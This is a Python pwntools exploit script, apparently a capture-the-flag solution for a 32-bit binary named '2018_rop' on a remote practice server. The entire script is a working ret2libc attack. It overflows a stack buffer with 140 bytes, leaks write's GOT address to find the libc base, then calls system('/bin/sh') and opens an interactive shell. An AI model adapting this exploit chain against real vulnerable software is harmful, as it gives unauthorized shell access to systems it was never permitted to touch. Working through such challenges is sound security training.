from pwn import *

context.log_level = "debug"

exe = ELF("./2018_rop")
# libc = exe.libc
libc = ELF("./libc-2.27.so")
# r = exe.process()
r = remote("node4.buuoj.cn", 27822)

r.sendline(
    cyclic(140)
    + p32(exe.plt["write"])
    + p32(exe.sym["main"])
    + p32(1)
    + p32(exe.got["write"])
    + p32(4)
)
libc_write = u32(r.recv(4))
libc_base = libc_write - libc.sym["write"]
libc_system = libc_base + libc.sym["system"]
libc_bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
r.sendline(cyclic(140) + p32(libc_system) + p32(0) + p32(libc_bin_sh))
r.interactive()
